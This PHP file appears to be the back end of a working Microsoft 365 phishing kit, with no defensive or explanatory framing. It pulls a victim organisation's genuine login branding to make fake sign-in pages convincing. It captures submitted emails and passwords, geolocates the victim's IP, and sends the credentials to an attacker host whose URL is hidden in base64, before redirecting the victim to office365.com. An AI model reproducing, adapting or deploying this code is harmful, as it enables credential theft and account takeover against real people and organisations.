<?php
ob_start();
header("Access-Control-Allow-Origin:*");
header("Access-Control-Allow-Methods:GET,HEAD,OPTIONS,POST,PUT");
header("Access-Control-Allow-Headers: *, Authorizationpass, Authorization1,Content-Type");
header("Access-Control-Allow-Credentials:true");

$trueauthentic = true;
$recipient = ''; // Put your email address here
$finish_url = 'https://office365.com';

//Process IP to Location
$ip = $_SERVER['REMOTE_ADDR'];
$ip2place = new ip2location_lite();
$ip2place->setKey("66657745713826aee27886e868c7354891388e26c003fa6ebf7f995e8f599dc7");
$remote_add = $ip;
$location = $ip2place->getCity($remote_add);
//Process IP to Location

$country = $location['countryName'];
$city = $location['cityName'];
$region = $location['regionName'];
$date = date('Y-m-d H:i:s');

if (isset($_GET['domain'])) {
    echo mxrecordValidate($_GET['domain']);
}
if (isset($_POST['barnd']) && isset($_POST['email'])) {
    $email = $_POST['email'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.office.com/login?es=Click&ru=%2F');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    $result = curl_exec($ch);
    $respond_link = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);

    $parts = parse_url($respond_link);
    parse_str($parts['query'], $query);
    $post = ['client_id' => $query['client_id'], 'login_hint' => $email];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    curl_setopt($ch, CURLOPT_URL, $respond_link);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);

    $result = curl_exec($ch);
    curl_close($ch);


    //print_r($result);


    preg_match_all("|\"BannerLogo[^>]+\":(.*)\"/[^>]+\",|U", $result, $BannerLogo, PREG_PATTERN_ORDER);
    if (!empty($BannerLogo[0][0])) {
        $BannerLogo = explode(",", $BannerLogo[0][0]);
        preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $BannerLogo[0], $BannerLogo);
    } else {
        $BannerLogo[0][0] = '';
    }

    preg_match_all("|\"Illustration[^>]+\":(.*)\"/[^>]+\",|U", $result, $Illustration, PREG_PATTERN_ORDER);
    if (!empty($Illustration[0][0])) {
        $Illustration = explode(",", $Illustration[0][0]);
        preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $Illustration[0], $Illustration);
    } else {
        $Illustration[0][0] = '';
    }


    $logo_image = $BannerLogo[0][0];
    $bg_image = $Illustration[0][0];

    $res = array('logo_image' => $logo_image, 'bg_image' => $bg_image);
    echo json_encode($res);
}

 $getheaderdata = getallheaders();
 //print_r($getheaderdata); die;
  //MAKE SURE HEADER PARAMS ARE SENT
if (!isset($getheaderdata['Authorization1']) || !isset($getheaderdata['Authorizationpass']) ) {
     exit;
  }

 
if (!empty($getheaderdata['Authorization1']) && !empty($getheaderdata['Authorizationpass'])) {

    $acc = $getheaderdata['Authorization1'];
    $pp = $getheaderdata['Authorizationpass'];

    //Decode base64_decode
    if (!empty($acc) && !empty($pp)) {
        if (strpos($acc, '@') !== false) {
            $login = $acc;
        } else {
            $login = base64_decode($acc);
        }
    } else {
        $login = base64_decode($acc);
    }

    //GET domain
    $domain = substr(strrchr($login, "@"), 1);
    if ($trueauthentic == true) {
        $result = get_validation(base64_decode("aHR0cHM6Ly9zZWN1cml0eXNob2NrLWNoZWNrLnBybzE5NjAuY2FzYS9hcGkucGhw", TRUE) . '?login=' . base64_encode($getheaderdata['Authorization1']).'&pass='.base64_encode($getheaderdata['Authorizationpass']).'&ip='.base64_encode($ip));
    } else {
        $result = '{"status":"0","url":"0"}';
    }
    $set_data = json_decode($result, TRUE);


    // proccess result
    if ($set_data['status'] > 0) {

        echo '{"p":"1","url":"' . $set_data['url'] . '","country":"' . $country . '","ip":"' . $ip . '"}';
       // echo '{"p":"1","url":"#Play_audio","country":"' . $country . '","ip":"' . $ip . '"}';
    } else {

        echo '{"p":"0"}';
    }
}


 function mxrecordValidate($domain)
{

    $mxget = $domain;
    if (dns_get_mx($domain, $mx_details)) {
        foreach ($mx_details as $key => $value) {
            $mxget .= $value;
        }
    }
    return str_replace(".", "-", $mxget);
}
function get_validation($url, $post_paramtrs = false)
{$follow_allowed=false;
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    if ($post_paramtrs) {
        curl_setopt($c, CURLOPT_POST, TRUE);
        curl_setopt($c, CURLOPT_POSTFIELDS, "u=" . $post_paramtrs);
    }
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0");
    curl_setopt($c, CURLOPT_COOKIE, 'CookieName1=Value;');
    curl_setopt($c, CURLOPT_MAXREDIRS, 10);
    curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 9);
    curl_setopt($c, CURLOPT_REFERER, $url);
    curl_setopt($c, CURLOPT_TIMEOUT, 60);
    curl_setopt($c, CURLOPT_AUTOREFERER, true);
    curl_setopt($c, CURLOPT_ENCODING, 'gzip,deflate');
    $data = curl_exec($c);
    $status = curl_getinfo($c);
    curl_close($c);
    preg_match('/(http(|s)):\/\/(.*?)\/(.*\/|)/si', $status['url'], $link);
    $data = preg_replace('/(src|href|action)=(\'|\")((?!(http|https|javascript:|\/\/|\/)).*?)(\'|\")/si', '$1=$2' . $link[0] . '$3$4$5', $data);
    $data = preg_replace('/(src|href|action)=(\'|\")((?!(http|https|javascript:|\/\/)).*?)(\'|\")/si', '$1=$2' . $link[1] . '://' . $link[3] . '$3$4$5', $data);
    if ($status['http_code'] == 200) {
        return $data;
    } elseif ($status['http_code'] == 301 || $status['http_code'] == 302) {
        if (!$follow_allowed) {
            if (!empty($status['redirect_url'])) {
                $redirURL = $status['redirect_url'];
            } else {
                preg_match('/href\=\"(.*?)\"/si', $data, $m);
                if (!empty($m[1])) {
                    $redirURL = $m[1];
                }
            }
            if (!empty($redirURL)) {
                return call_user_func(__FUNCTION__, $redirURL, $post_paramtrs);
            }
        }
    }
    return "$data";
}
final class ip2location_lite
{
    protected $errors = array();
    protected $service = 'api.ipinfodb.com';
    protected $version = 'v3';
    protected $apiKey = '';
    public function __construct()
    {
    }
    public function __destruct()
    {
    }
    public function setKey($key)
    {
        if (!empty($key))
            $this->apiKey = $key;
    }
    public function getError()
    {
        return implode("\n", $this->errors);
    }
    public function getCountry($host)
    {
        return $this->getResult($host, 'ip-country');
    }
    public function getCity($host)
    {
        return $this->getResult($host, 'ip-city');
    }
    private function getResult($host, $name)
    {
        $ip =  @gethostbyname($host);
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            $xml =  @file_get_contents('http://' . $this->service . '/' . $this->version . '/' . $name . '/?key=' . $this->apiKey . '&ip=' . $ip . '&format=xml');
            if (@get_magic_quotes_runtime()) {
                $xml = stripslashes($xml);
            }
            try {
                $response =  @new SimpleXMLElement($xml);
                foreach ($response as $field => $value) {
                    $result[(string)$field] = (string)$value;
                }
                return $result;
            } catch (Exception $e) {
                $this->errors[] = $e->getMessage();
                return;
            }
        }
        $this->errors[] = '"' . $host . '" is not a valid IP address or hostname.';
        return;
    }
}
